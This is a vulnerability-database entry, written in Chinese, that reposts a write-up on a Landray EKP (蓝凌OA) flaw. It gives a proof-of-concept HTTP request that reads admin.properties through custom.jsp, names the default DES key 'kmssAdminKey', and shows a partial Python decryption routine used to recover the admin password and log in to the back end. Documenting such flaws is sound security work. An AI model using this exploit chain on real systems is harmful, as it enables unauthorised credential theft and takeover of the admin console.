---
source: "MrWQ/vulnerability-paper"
title: "蓝凌EKP custom.jsp文件读取+DES配置密码解密"
product: "蓝凌EKP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本；admin.properties可读、固定密钥实现"
prerequisites: "文件读取前台，后续后台登录依赖解密凭证"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/4VTgnH3Hg15xE7W478fmUg"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E5%87%8COA/X%20%E5%87%8C%20OA%20%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20-%20DES%20%E8%A7%A3%E5%AF%86.md"
id: "vw-543efae7a3479c8d713fc654"
entity_id: "ve-543efae7a3479c8d713fc654"
schema_version: "1"
---

# 蓝凌EKP custom.jsp文件读取+DES配置密码解密

## 条目说明

- 对象与具体问题：蓝凌EKP；custom.jsp文件读取+DES配置密码解密
- 版本、配置及部署条件：无版本；admin.properties可读、固定密钥实现
- 认证与权限前提：文件读取前台，后续后台登录依赖解密凭证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与组合链文章前半大段重复
- 请求JSON含转码反斜线，DES函数缺变量/导入且返回函数本身，非完整可运行代码
- 关键解密结果在截图，宣传尾部冗长

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4VTgnH3Hg15xE7W478fmUg)

![](../../.resource/remote/54fe16b5149a009aaa4b95c9cdb1fdda522713763f70e45d383a1190aa630b9f.png)

X 凌 OA 系统任意文件读取 - DES 解密

一、漏洞描述  

深圳市蓝凌软件股份有限公司数字 OA(EKP) 存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息

二、漏洞影响

蓝凌 OA

三、

利用 蓝凌 OA custom.jsp 任意文件读取漏洞 读取配置文件

读取路径：

```
/WEB-INF/KmssConfig/admin.properties
```

读取文件：

![](../../.resource/remote/1335e3e9f36c8b5d618542e27290704c069984298e55a929a5ac34fcd990fdc8.png)

POC：

```http
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: 127.0.0.1
User-Agent: Go-http-client/1.1
Content-Length: 60
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"\}\}
```

> 请求长度说明：原资料 Content-Length 为 60；保留原始标头；其数值未据实际请求体重新计算或验证。

获取密码 DES 解密登陆后台：默认密钥为 kmssAdminKey

![](../../.resource/remote/4a90b05a611cf317992b428cc0269e478b991378ce58df2570bf097036f96a4e.png)

访问后台登台：

http://127.0.0.1/admin.do

![](../../.resource/remote/5001d661a2c918e110cc1ae0fcfa2a0a716f3621d5f45da7534ce0600d3d1d87.png)  

成功登陆后台：  

![](../../.resource/remote/30df28fcc5d35fa77c4e9d39242299840aaca7bb7c3d88659c6947a6515ebe66.png)

编写 POC 脚本验证：  

![](../../.resource/remote/570b45d8dd520b09eb9d501a1b23d4bd37948974ea95b1d06e9ad8248e977587.png)

还需要自己去验证解密：  

编写本地 DES 解密：  

```
def decrypt_str(s):
 k = des(Des_Key, ECB, Des_IV, pad=None, padmode=PAD_PKCS5)
 decrystr = k.decrypt(base64.b64decode(s))
 print(decrystr)
 return decrypt_str
```

![](../../.resource/remote/c9c12fd442569bb7e364747b38da252e3040d5953aafa95583f2f03ab29fd98d.png)

发现 key 字符过长：  

ValueError: Invalid DES key size. Key must be exactly 8 bytes long.

密钥长了，查了一下下 需要前面 8 位就 OK 也能解开

![](../../.resource/remote/e71471af56a277f9d5a27d00f2778d818fb152e90f18f197da923fa1774be115.png)

直接解密明文：

![](../../.resource/remote/14275d707513e4159f9ef2a86923acb846df6106b5276853ce20bb697680f497.png)

参考：  

https://github.com/Cr4y0nXX/LandrayReadAnyFile

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

如果本文内容侵权或者对贵公司业务或者其他有影响，请联系作者删除。  

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![](../../.resource/remote/7a6d2f13ca361326dd71145e64ce4b16b853688149568ad8f7594066b738e9c1.jpg)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人 CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF 主页：https://www.freebuf.com/author/thelostworld?type=article

语雀博客主页：https://www.yuque.com/thelostworld

![](../../.resource/remote/64b19fa585837043e1eae7cea904e1b86a2db6ccb2fdde1d09513641413365d6.png)

欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  

![](../../.resource/remote/9255e3712e3885c431d5087872642f32c2e71629b39b93e381a5a147814af2d4.png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
